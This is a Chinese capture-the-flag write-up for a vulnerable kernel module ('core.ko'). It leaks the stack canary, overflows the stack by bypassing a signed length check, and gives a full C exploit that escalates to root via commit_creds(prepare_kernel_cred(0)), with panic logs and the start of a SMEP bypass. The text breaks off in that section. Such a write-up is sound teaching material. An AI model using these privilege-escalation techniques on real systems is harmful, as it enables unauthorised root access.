# ctf-kernel:give to player

## 1. 题目

压缩文件core_give.tar的内容

```bash
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give$ tar -tf core_give.tar
give_to_player/
give_to_player/bzImage
give_to_player/core.cpio
give_to_player/start.sh
give_to_player/vmlinux
```

加压得到，并修改start.sh后得到如下信息：

```bash
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$ cat start.sh
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

这里将内存修改位512M后成功启动（默认64M无法启动）（来自参考的提醒）

根据参考文件的说法，init脚本中存在poweroff命令，因此需要我们修改init脚本，并重新打包rootfs

```bash
-rwxrwxr-x 1 ash ash 40738712 3月  24  2018 vmlinux*
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$ file core.cpio
core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix, original size modulo 2^32 53442048
```

发现core.cpio是gzip压缩文件，通过如下的命令解压，并从新制作新的rootfs

```bash
mv core.cpio core.cpio.gz
gzip -d core.cpio.gz
mkdir rootfs
cd rootfs
cpio -idmv <../core.cpio
find .|cpio -o -H newc >../new_rootfs.cpio
```



修改后的init脚本：

```bash
 #!/bin/sh
 mount -t proc proc /proc
 mount -t sysfs sysfs /sys
 mount -t devtmpfs none /dev
 /sbin/mdev -s
 mkdir -p /dev/pts
 mount -vt devpts -o gid=4,mode=620 none /dev/pts
 chmod 666 /dev/ptmx
 cat /proc/kallsyms > /tmp/kallsyms
 echo 1 > /proc/sys/kernel/kptr_restrict
 echo 1 > /proc/sys/kernel/dmesg_restrict
 ifconfig eth0 up
 udhcpc -i eth0
 ifconfig eth0 10.0.2.15 netmask 255.255.255.0
 route add default gw 10.0.2.2
 insmod /core.ko

 #poweroff -d 120 -f &
 setsid /bin/cttyhack setuidgid 1000 /bin/sh
 echo 'sh end!\n'
 umount /proc
 umount /sys

 poweroff -d 0  -f
```

修改start.sh脚本中的initrd参数即可：

```bash
qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./new_rootfs.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

注意这里使用-s，因此可以使用gdb调试内核。

## 2. 分析

### 2.1. 环境信息分析

启动后的内容：

```bash
/ $ ls -al
total 47028
drwxrwxr-x   13 chal     chal             0 Apr 21 13:32 .
drwxrwxr-x   13 chal     chal             0 Apr 21 13:32 ..
-rw-------    1 chal     chal           156 Apr 21 13:50 .ash_history
drwxrwxr-x    2 chal     chal             0 Apr 21 13:18 bin
-rw-rw-r--    1 chal     chal          6984 Apr 21 13:18 core.ko
drwxr-xr-x    8 root     root          2320 Apr 21 13:32 dev
drwxrwxr-x    2 chal     chal             0 Apr 21 13:18 etc
-rwxrwxr-x    1 chal     chal            66 Apr 21 13:18 gen_cpio.sh
-rwxrwxr-x    1 chal     chal           559 Apr 21 13:22 init
drwxrwxr-x    3 chal     chal             0 Apr 21 13:18 lib
drwxrwxr-x    2 chal     chal             0 Apr 21 13:18 lib64
lrwxrwxrwx    1 chal     chal            11 Apr 21 13:18 linuxrc -> bin/busybox
dr-xr-xr-x   51 root     root             0 Apr 21 13:32 proc
drwxrwxr-x    2 chal     chal             0 Apr 21 13:18 root
drwxrwxr-x    2 chal     chal             0 Apr 21 13:18 sbin
dr-xr-xr-x   12 root     root             0 Apr 21 13:32 sys
drwxrwxr-x    2 chal     chal             0 Apr 21 13:32 tmp
drwxrwxr-x    4 chal     chal             0 Apr 21 13:18 usr
-rwxrwxr-x    1 chal     chal      48134320 Apr 21 13:18 vmlinux
/ $ 

```

分析core.ko

```bash
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player/core_rootfs/rootfs$ file core.ko
core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=54943668385c6573ec1b40a7c06127d9423103b3, not stripped
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player/core_rootfs/rootfs$ checksec core.ko
[*] '/home/ash/03.ctf/10.kernel/01.core_give/give_to_player/core_rootfs/rootfs/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

存在栈保护和NX保护

使用IDA打开：

init_module函数逻辑如下：

```c
__int64 init_module()
{
  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
  printk(&unk_2DE);
  return 0LL;
}
```

proc_create函数原型如下：

```c
struct proc_dir_entry *proc_create(const char *name, umode_t mode,
				   struct proc_dir_entry *parent,
				   const struct proc_ops *proc_ops)
```

根据分析proc_ops中定义函数只有3个：core_write、core_ioctl和offset core_release

因此可以调用ioctrl，write等操作/proc/core目录，/proc/core信息如下：

```bash
/ $ ls -al /proc/core
-rw-rw-rw-    1 root     root             0 Apr 21 14:01 /proc/core
```

可以通过open('/proc/core'，...)来操作

### 2.2. 代码和漏洞分析

首先check下core_ioctl函数逻辑：

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk(&unk_2CD);
      off = a3;
      break;
    case 0x6677889A:
      printk(&unk_2B3);
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

* 命令0x6677889B触发read操作

* 命令0x6677889C设置off，这里的off是外部可控制的

* 命令0x6677889A触发core_copy_func操作



在分析core_read函数：

```c
unsigned __int64 __fastcall core_read(__int64 a1)
{
  char *v2; // rdi
  __int64 i; // rcx
  unsigned __int64 result; // rax
  char v5[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+40h] [rbp-10h]

  v6 = __readgsqword(0x28u);
  printk(&unk_25B);
  printk(&unk_275);
  v2 = v5;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v5, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(a1, &v5[off], 64LL);
  if ( !result )
    return __readgsqword(0x28u) ^ v6;
  __asm { swapgs }
  return result;
}
```

代码copy_to_usr(a1,&v5[off],64)可用于进行canary泄露，因为off是外部可控制的



在分析core_write函数：

```c
__int64 __fastcall core_copy_func(__int64 a1)
{
  __int64 result; // rax
  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF

  v2[8] = __readgsqword(0x28u);
  printk(&unk_215);
  if ( a1 > 63 )
  {
    printk(&unk_2A1);
    return 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(v2, &name, (unsigned __int16)a1);
  }
  return result;
}
```

这里会设置name，copy长度为a1到栈上的变量v2上

分析a1>63汇编代码：

> .text:000000000000011A                 cmp     rbx, 3Fh ; '?'
> .text:000000000000011E                 jg      short loc_133

这里是有符号跳转，但是a1在qmemcpy函数中，被转换位unsigned _int16，因此这里可以通过负数绕过大小限制，导致通过v2实现栈溢出。



那么name是否可以被外部控制？

查询name的xref，发现name在core_write函数中被赋值：

```c
__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk(&unk_215);
  if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
    return (unsigned int)a3;
  printk(&unk_230);
  return 4294967282LL;
}
```

因此攻击思路如下：

* open打开/proc/core文件

* 通过ioctrl设置off

* 通过ioctrl调用core_read函数泄露canary

* 通过write设置name，那么的内容为攻击代码，再name中会调用commit_creds(prepare_creds(0))完成提权

* 通过ioctrl调用core_copy_func函数，让其栈溢出，完成漏洞利用。

* 在用户空间，执行system('/bin/sh')得到root shell



## 3.漏洞利用

### 3.1. 调试

因为qemu启动的时候使用了-s,因此可以通过如下的命令启动gdb调试，注意默认端口为1234：

> target remote:1234

启动后调试结果如下：

```bash
pwndbg> target remote:1234
Remote debugging using :1234
warning: No executable has been specified and target does not support
determining executable automatically.  Try using the "file" command.
0xffffffffa086e7d2 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────
 RAX  0xffffffffa086e7d0 ◂— sti    
 RBX  0xffffffffa1210480 ◂— add    byte ptr [rax], al /* 0x80000000 */
 RCX  0x0
 RDX  0x0
 RDI  0x0
 RSI  0x0
 R8   0xffff901f5ca1bf20 —▸ 0xffffa8b400157960 ◂— 1
 R9   0x0
 R10  0x0
 R11  0x3a2
 R12  0xffffffffa1210480 ◂— add    byte ptr [rax], al /* 0x80000000 */
 R13  0xffffffffa1210480 ◂— add    byte ptr [rax], al /* 0x80000000 */
 R14  0x0
 R15  0x0
 RBP  0x0
 RSP  0xffffffffa1203eb8 —▸ 0xffffffffa00b65a0 ◂— jmp    0xffffffffa00b6541
 RIP  0xffffffffa086e7d2 ◂— ret    
────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0xffffffffa086e7d2    ret    <0xffffffffa00b65a0>
    ↓
   0xffffffffa00b65a0    jmp    0xffffffffa00b6541 <0xffffffffa00b6541>
    ↓
   0xffffffffa00b6541    or     byte ptr ds:[r12 + 2], 0x20
   0xffffffffa00b6548    pushfq 
   0xffffffffa00b6549    pop    rax
   0xffffffffa00b654a    test   ah, 2
   0xffffffffa00b654d    je     0xffffffffa00b65e5 <0xffffffffa00b65e5>
 
   0xffffffffa00b6553    call   0xffffffffa00d4720 <0xffffffffa00d4720>
 
   0xffffffffa00b6558    call   0xffffffffa00b6430 <0xffffffffa00b6430>
 
   0xffffffffa00b655d    mov    rax, qword ptr [rbx]
   0xffffffffa00b6560    test   al, 8
─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0xffffffffa1203eb8 —▸ 0xffffffffa00b65a0 ◂— jmp    0xffffffffa00b6541
01:0008│      0xffffffffa1203ec0 ◂— 0xc2
02:0010│      0xffffffffa1203ec8 —▸ 0xffffffffa16c4900 ◂— int3    /* 0xcccccccccccccccc */
03:0018│      0xffffffffa1203ed0 —▸ 0xffff901f5ccce900 ◂— jb     0xffff901f5ccce971 /* 0x65642f3d746f6f72; 'root=/dev/ram' */
04:0020│      0xffffffffa1203ed8 —▸ 0xffffffffa16cc2c0 ◂— int3    /* 0xcccccccccccccccc */
05:0028│      0xffffffffa1203ee0 ◂— 0
... ↓
07:0038│      0xffffffffa1203ef0 —▸ 0xffffffffa00b673a ◂— jmp    0xffffffffa00b6735
───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────
 ► f 0 ffffffffa086e7d2
   f 1 ffffffffa00b65a0
   f 2               c2
   f 3 ffffffffa16c4900
   f 4 ffff901f5ccce900
   f 5 ffffffffa16cc2c0
   f 6                0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
 ()

```

但是为了能够给core_read，core_write或者core_copy_func函数下断点，我们还行设置下init脚本，让其再install core.ko后，将内核的符号打印到/tmp目录下，修改的脚本如下：

```bash
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2
insmod /core.ko
cat /proc/kallsyms > /tmp/kallsyms #this is for debug

#poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

这样我们就能够获取到core_write等函数的地址：

> ffffffffc0177000 t core_release    [core]
> ffffffffc017715f t core_ioctl    [core]
> ffffffffc01771b9 t exit_core    [core]
> ffffffffc0177011 t core_write    [core]
> ffffffffc01771b9 t cleanup_module    [core]
> ffffffffc0177063 t core_read    [core]
> ffffffffc01770f6 t core_copy_func    [core]

### 3.2.漏洞利用脚本

1、off应该设置多少？

查看core_read函数：

```asm6502
.text:0000000000000063 core_read       proc near               ; CODE XREF: core_ioctl+37↓p
.text:0000000000000063
.text:0000000000000063 var_10          = qword ptr -10h
.text:0000000000000063
.text:0000000000000063                 push    rbx
.text:0000000000000064                 mov     rbx, rdi
.text:0000000000000067                 mov     rdi, offset unk_25B
.text:000000000000006E                 sub     rsp, 48h
.text:0000000000000072                 mov     rax, gs:28h
.text:000000000000007B                 mov     [rsp+50h+var_10], rax
.text:0000000000000080                 xor     eax, eax
```

可以分析出：

> |---ret-address---|-----rbx------|----canary---|-----size=0x40---------|

因此只需要将off设置为0x40即可获得canary和ret-address

2、如何设置name？

查看core_copy_func函数

```asm6502
.text:00000000000000F6 core_copy_func  proc near               ; CODE XREF: core_ioctl+2D↓p
.text:00000000000000F6
.text:00000000000000F6 var_10          = qword ptr -10h
.text:00000000000000F6
.text:00000000000000F6                 push    rbx
.text:00000000000000F7                 mov     rbx, rdi
.text:00000000000000FA                 mov     rdi, offset unk_215
.text:0000000000000101                 sub     rsp, 48h
.text:0000000000000105                 mov     rax, gs:28h
.text:000000000000010E                 mov     [rsp+50h+var_10], rax
.text:0000000000000113                 xor     eax, eax
```

栈布局如下：

> |---ret-address---|-----rbx------|----canary---|-----size=0x40---------|

因此第8个为canary，第10个为ret-address(下标从0开始），那么的定义如下：

```c
    unsigned long long name_payload[11];
    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;//canary
    name_payload[10] = &promote_root;//rip
```

promote_root为执行commit_creds(prepare_kernel_cred(0))的wraper函数。



promote_root的代码如下：

```c
void promote_root()
{

    int (*commit_cred)(struct cred *new);
    struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);

    commit_cred = commit_cred_addr;
    prepare_kernel_cred =  prepare_kernel_cred_addr;
    (*commit_cred)((*prepare_kernel_cred)(0));
}
```

但是这个版本执行会出现问题，因为栈不平衡？为什么？我们继续分析

### 3.3. 栈平衡

首先分析下core_ioctl->core_copy_fun过程，从core_copy_fun函数的返回过程：

core_copy_fun返回后会进入如下代码执行：

```asm6502
.text:00000000000001B5
.text:00000000000001B5 loc_1B5:                                ; CODE XREF: core_ioctl+1A↑j
.text:00000000000001B5                                         ; core_ioctl+32↑j ...
.text:00000000000001B5                 xor     eax, eax
.text:00000000000001B7                 pop     rbx
.text:00000000000001B8                 retn
.text:00000000000001B8 core_ioctl      endp
```

代码会设置返回执行eax=0，pop rbx，然后执行retn，可以理解为pop rip

因此我们可以讲core_ioctl和core_copy_fun的栈一起画出来，形式如下：

> |--rip(ioctl)--|--rbx(ioctl)--|---ret-address---|--rbx--|--canary--|--size=0x40--|

现在ret-address的地址变成了promote_root函数地址，我们查看下promote_root函数：

```asm6502
.text:00000000000012A9 promote_root    proc near               ; DATA XREF: main+1AF↓o
.text:00000000000012A9
.text:00000000000012A9 commit_cred     = qword ptr -10h
.text:00000000000012A9 prepare_kernel_cred= qword ptr -8
.text:00000000000012A9
.text:00000000000012A9 ; __unwind {
.text:00000000000012A9                 endbr64
.text:00000000000012AD                 push    rbp
.text:00000000000012AE                 mov     rbp, rsp
.text:00000000000012B1                 sub     rsp, 10h
.text:00000000000012B5                 mov     rax, cs:commit_cred_addr
.text:00000000000012BC                 mov     [rbp+commit_cred], rax
.text:00000000000012C0                 mov     rax, cs:prepare_kernel_cred_addr
.text:00000000000012C7                 mov     [rbp+prepare_kernel_cred], rax
.text:00000000000012CB                 mov     rax, [rbp+prepare_kernel_cred]
.text:00000000000012CF                 mov     edi, 0
.text:00000000000012D4                 call    rax
.text:00000000000012D6                 mov     rdx, rax
.text:00000000000012D9                 mov     rax, [rbp+commit_cred]
.text:00000000000012DD                 mov     rdi, rdx
.text:00000000000012E0                 call    rax
.text:00000000000012E2                 nop
.text:00000000000012E3                 leave
.text:00000000000012E4                 retn
.text:00000000000012E4 ; } // starts at 12A9
.text:00000000000012E4 promote_root    endp
```

（pS：这里看起来有点奇怪，为什么没有栈平衡，即缺少mov rsp，rpb，或者add rsp,10h,如果需要手动平衡，我们保留：asm("mov %rbp,%rsp");)

执行promote_root函数开栈过程后，栈变成了：

> |--rip(ioctl)--|--rbx(ioctl)--|---rbp---|--size=0x10--|

因此在执行leave（pop rbp）后，会将rbx(ioctl)作为返回地址，即retn指令会落脚在rbx(ioctl)上。

方式1：在执行完成commit_creds(prepare_kernel_cred(0))后，直接跳转到0x:00000000000001B执行(即原始的返回地址执行)，当然要确保栈平衡，还需要将rbp弹窗：

其代码如下：

```c
void promote_root()
{

    int (*commit_cred)(struct cred *new);
    struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);

    commit_cred = commit_cred_addr;
    prepare_kernel_cred =  prepare_kernel_cred_addr;
    (*commit_cred)((*prepare_kernel_cred)(0));
    
    asm("mov %rbp,%rsp");    //修复栈帧
    asm("pop %rbp"); //弹出rbp
    asm("mov %0,%%rax;\
        jmp %%rax;"
        :
        :"r"(ret_addr)
        :"%rax");
    
}
```

第一步：将rbp赋值rsp，因为rbp保存了原始的rsp（执行promote_root函数前）的值，因此只需要通过rbp还原rsp即可

第二步：将栈上的rbp弹出

第三步：直接跳转到ret_addr执行（0x:00000000000001B），此时暂时只有|--rip(ioctl)--|--rbx(ioctl)--|



执行效果如下：

```bash
/ $ ./exp
61778bf81adb4f00 00007ffe3cd5d8c0 ffffffffc015719b ffff96d51f994b40 ffffffff853dd6d1 000000000000889b ffff96d517f83400 ffffffff8538ecfa 0000000000000026 0000000000000000 0000000000000000 
get canay is:61778bf81adb4f00
commit_cred:ffffffff8529c8e0
prepare_kernel_cred:ffffffff8529cce0
promote_root:0000558770bc62a9
name_payload_len:88
/ # id
uid=0(root) gid=0(root)
/ # 

```

完整的poc如下：

```c
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<unistd.h>

unsigned long long commit_cred_addr;
unsigned long long prepare_kernel_cred_addr;
unsigned long long ret_addr;


void promote_root()
{

    int (*commit_cred)(struct cred *new);
    struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);

    commit_cred = commit_cred_addr;
    prepare_kernel_cred =  prepare_kernel_cred_addr;
    (*commit_cred)((*prepare_kernel_cred)(0));
    
    asm("mov %rbp,%rsp");    //修复栈帧
    asm("pop %rbp");
    asm("mov %0,%%rax;\
        jmp %%rax;"
        :
        :"r"(ret_addr)
        :"%rax");
    
}

unsigned long long get_kernel_func_addr(char* cmd)
{
    char buf[64];
    memset(buf,0,sizeof(buf));
    FILE *fp = popen(cmd,"r");
    fgets(buf,sizeof(buf),fp);
    return strtoul(buf,NULL,16);
}
unsigned long long get_commit_cred_addr()
{
    char *cmd="cat /tmp/kallsyms |grep commit_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}
unsigned long long get_prepare_kernel_cred_addr()
{
    char *cmd="cat /tmp/kallsyms |grep prepare_kernel_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}

int main(int argc,char ** argv)
{
    int fd = open("/proc/core",O_RDWR);
    unsigned long long buf[64];

    unsigned int off_set_cmd = 0x6677889C;
    unsigned int read_cmd = 0x6677889B;
    unsigned int core_copy_func_cmd = 0x6677889A;

    //first setting off = 64
    int off = 64;
    ioctl(fd,off_set_cmd,64);

    //call read to leak canary
    ioctl(fd,read_cmd,buf);

    for (int i=0;i<64;i++)
    {
        printf("%016llx ",buf[i]);
    
    }
    printf("\n");
    unsigned long long canary = buf[0];
    ret_addr = buf[2];
    printf("get canay is:%016llx\n",canary);


    //set commit_cred and prepare_kernel_cred address
    commit_cred_addr = get_commit_cred_addr();
    prepare_kernel_cred_addr = get_prepare_kernel_cred_addr();
    printf("commit_cred:%016llx\n",commit_cred_addr);
    printf("prepare_kernel_cred:%016llx\n",prepare_kernel_cred_addr);
    //promote_root(commit_cred_addr,prepare_kernel_cred_addr);
    
    unsigned long long name_payload[11];
    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;//canary
    name_payload[10] = &promote_root;//rip
    printf("promote_root:%016llx\n",name_payload[10]);
    printf("name_payload_len:%u\n",sizeof(name_payload));
    //set name
    write(fd,name_payload,sizeof(name_payload));
    
    //triger stack mash and excute shellcode to promote to root
    long long len = -65448;//unsigned short len =88
    ioctl(fd,core_copy_func_cmd,len);
    //we are root now
    system("/bin/sh");
    sleep(2);

    return 0;
}

```

需要注意：promote_root函数一定不能有参数，因为是直接jmp到该函数执行的，没有进行参数准备的操作。



方式2：传递给name变量用于覆盖ret_address的值地址不是promote_root函数的地址，而是从mov %rbp，%rsp开始执行，那么执行后的栈空间布局如下：

> |--rip(ioctl)--|--rbx(ioctl)--|--size=0x10--|

最后只需要mov %rsp,%rbp,然后正常执行leave和retn指令即可



promote_root代码：

```c
void promote_root()
{

    int (*commit_cred)(struct cred *new);
    struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);

    commit_cred = commit_cred_addr;
    prepare_kernel_cred =  prepare_kernel_cred_addr;
    (*commit_cred)((*prepare_kernel_cred)(0));
    asm("mov %rbp,%rsp");//因为反汇编看出缺少部分内容
    asm("xor %rax,%rax");//设置返回值为0
    return;    
}
```

name设置 ：

```c
    unsigned long long name_payload[11];
    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;//canary
    name_payload[10] = (&promote_root)+5;//rip
    printf("promote_root:%016llx\n",&promote_root);
    printf("promote_root+5:%016llx\n",name_payload[10]);
    printf("name_payload_len:%u\n",sizeof(name_payload));
```

+5 表明跳过了如下代码：

> .text:00000000000012A9 F3 0F 1E FA                 endbr64
> .text:00000000000012AD 55                          push    rbp
> 



PS：失败了，不知道什么原因，最终会报错(后面在check下）：

```bash
/ $ ./exp-1
bccab44321adcd00 00007fffeb602060 ffffffffc03e419b ffff8c361f99cb40 ffffffff835dd6d1 000000000000889b ffff8c361fa5c500 ffffffff8358ecfa 0000000000000026 0000000000000000 0000000000000000 
get canay is:bccab44321adcd00
commit_cred:ffffffff8349c8e0
prepare_kernel_cred:ffffffff8349cce0
promote_root:0000558988bed2a9
promote_root+5:0000558988bed2ae
name_payload_len:88
[   44.476640] core: called core_writen
[   44.508902] general protection fault: 0000 [#1] SMP NOPTI
[   44.518681] Modules linked in: core(O)
[   44.523341] CPU: 0 PID: 1008 Comm: exp-1 Tainted: G           O     4.15.8 #19
[   44.527527] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1 04/01/2014
[   44.531814] RIP: 0010:unuse_pde+0x5/0x20
[   44.535423] RSP: 0018:ffffad8d0016fe78 EFLAGS: 00000246
[   44.537718] RAX: 00000000ffffffff RBX: 9090909090909090 RCX: 00000000000000cd
[   44.539627] RDX: 00000000000000cc RSI: 0000000000000040 RDI: 9090909090909090
[   44.541591] RBP: ffff8c361f99cb40 R08: ffff8c3617f87368 R09: 0000000000000000
[   44.544240] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8c361b427270
[   44.547003] R13: 000000006677889a R14: ffffffffffff0058 R15: 0000000000000000
[   44.549736] FS:  00007fce010f1740(0000) GS:ffff8c361ca00000(0000) knlGS:0000000000000000
[   44.552188] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   44.553857] CR2: 00000000006d1020 CR3: 000000001fa6e000 CR4: 00000000000006f0
[   44.556680] Call Trace:
[   44.559061]  proc_reg_unlocked_ioctl+0x3d/0x70
[   44.561896]  do_vfs_ioctl+0x8a/0x5b0
[   44.564238]  SyS_ioctl+0x6f/0x80
[   44.565645]  do_syscall_64+0x56/0xf0
[   44.567026]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2
[   44.569517] RIP: 0033:0x7fce00c00107
[   44.571259] RSP: 002b:00007fffeb601fb8 EFLAGS: 00000203 ORIG_RAX: 0000000000000010
[   44.573326] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fce00c00107
[   44.575684] RDX: ffffffffffff0058 RSI: 000000006677889a RDI: 0000000000000003
[   44.577902] RBP: 00007fffeb602270 R08: 00007fce00b59988 R09: 0000000000000013
[   44.580405] R10: 0000000000000000 R11: 0000000000000203 R12: 0000558988bed1c0
[   44.583526] R13: 00007fffeb602350 R14: 0000000000000000 R15: 0000000000000000
[   44.586214] Code: 84 00 00 00 00 00 e9 3b fc ff ff 0f 0b 90 90 90 90 90 90 90 90 90 48 83 c7 48 e9 d7 89 fb ff 0f 1f 80 00 00 00 00 b8 ff ff ff ff <3e> 0f c1 47 6c 3d 01 00 00 80 74 0 
[   44.593812] RIP: unuse_pde+0x5/0x20 RSP: ffffad8d0016fe78
[   44.597231] ---[ end trace 5f023e3f9e6ae13a ]---
[   44.601485] Kernel panic - not syncing: Fatal exception
[   44.607695] Kernel Offset: 0x2400000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   44.613712] Rebooting in 1 seconds..
```

不确定是不是因为rbp不对导致的？？？



方式3：传递给name变量用于覆盖ret_address的值地址还是promote_root函数的地址，为了平衡栈，我们需要多增加新增一个新的pop操作，当然mov %rsp,%rbp要优先执行：

> |--rip(ioctl)--|--rbx(ioctl)--|---rbp---|--size=0x10--|



promote_root代码：

```c
void promote_root()
{

    int (*commit_cred)(struct cred *new);
    struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);

    commit_cred = commit_cred_addr;
    prepare_kernel_cred =  prepare_kernel_cred_addr;
    (*commit_cred)((*prepare_kernel_cred)(0));
    asm("mov %rbp,%rsp");//因为反汇编看出缺少部分内容
    asm("pop %rbp"); 
}
```

name和设置和1保持一致。

但是，，但是失败了，

（和方式2会产生相同的问题，不确定是不是因为rbp不对导致的？？？）



## 4. SMEP和SMAP是能时？

### 4.1. rop绕过SMEP

修改start脚本，增加SMEP和SMAP的功能。

```bash
qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./new_rootfs.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet " \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-cpu qemu64,smep,smap \
-nographic  \

```

从新执行exp，发现exploit被SMEP拦截：

```bash
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ ./exp
625b0b3d90b0ca00 00007fffd464c3f0 ffffffffc03a019b ffffa0045fa30b40 ffffffffb8ddd6d1 000000000000889b ffffa00457f43f00 ffffffffb8d8ecfa 0000000000000026 0000000000000000 0000000000000000 
get canay is:625b0b3d90b0ca00
commit_cred:ffffffffb8c9c8e0
prepare_kernel_cred:ffffffffb8c9cce0
promote_root:000056354d48a2a9
name_payload_len:88
[    9.100595] core: called core_writen
[    9.100970] unable to execute userspace code (SMEP?) (uid: 1000)
[    9.108421] BUG: unable to handle kernel paging request at 000056354d48a2a9
[    9.112788] IP: 0x56354d48a2a9
[    9.114318] PGD 1f85d067 P4D 1f85d067 PUD 1f856067 PMD 1f857067 PTE 1856b025
[    9.117294] Oops: 0011 [#1] SMP NOPTI
[    9.119232] Modules linked in: core(O)
[    9.120932] CPU: 0 PID: 997 Comm: exp Tainted: G           O     4.15.8 #19
[    9.123671] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1 04/01/2014
[    9.126272] RIP: 0010:0x56354d48a2a9
[    9.128051] RSP: 0018:ffffb0d580173e70 EFLAGS: 00000296
[    9.129584] RAX: 0000000000000000 RBX: 9090909090909090 RCX: 0000000000000000
[    9.131237] RDX: 0000000000000000 RSI: ffffffffc03a2458 RDI: ffffb0d580173e70
[    9.132981] RBP: ffffffffffff0058 R08: 6163203a65726f63 R09: 0000000000000dec
[    9.134788] R10: 0000000000000004 R11: 6e65746972775f65 R12: ffffa0045b427270
[    9.137522] R13: 000000006677889a R14: ffffffffffff0058 R15: 0000000000000000
[    9.139838] FS:  00007fb8fbf36740(0000) GS:ffffa0045ca00000(0000) knlGS:0000000000000000
[    9.142626] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    9.144761] CR2: 000056354d48a2a9 CR3: 000000001f86a000 CR4: 00000000003006f0
[    9.146823] Call Trace:
[    9.148625]  ? proc_reg_unlocked_ioctl+0x31/0x70
[    9.150491]  ? do_vfs_ioctl+0x8a/0x5b0
[    9.151446]  ? SyS_ioctl+0x6f/0x80
[    9.152881]  ? do_syscall_64+0x56/0xf0
[    9.154281]  ? entry_SYSCALL_64_after_hwframe+0x3d/0xa2
[    9.156134] Code:  Bad RIP value.
[    9.157655] RIP: 0x56354d48a2a9 RSP: ffffb0d580173e70
[    9.159291] CR2: 000056354d48a2a9
[    9.161355] ---[ end trace 88db38b69bbca590 ]---
[    9.164447] Kernel panic - not syncing: Fatal exception
[    9.167807] Kernel Offset: 0x37c00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[    9.172931] Rebooting in 1 seconds.
```

如何计算kernel-base,通过kallsyms得到内核代码的加载基地址

> ffffffffa4000000 T _text

因此可以通过commit_creds函数地址，计算器offset的值：

> 0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0

还需要注意，vmlinux中的起始地址为0xFFFFFFFF81000000(可从IDA里面查看)

```c
.text:FFFFFFFF81000000 ; ===========================================================================
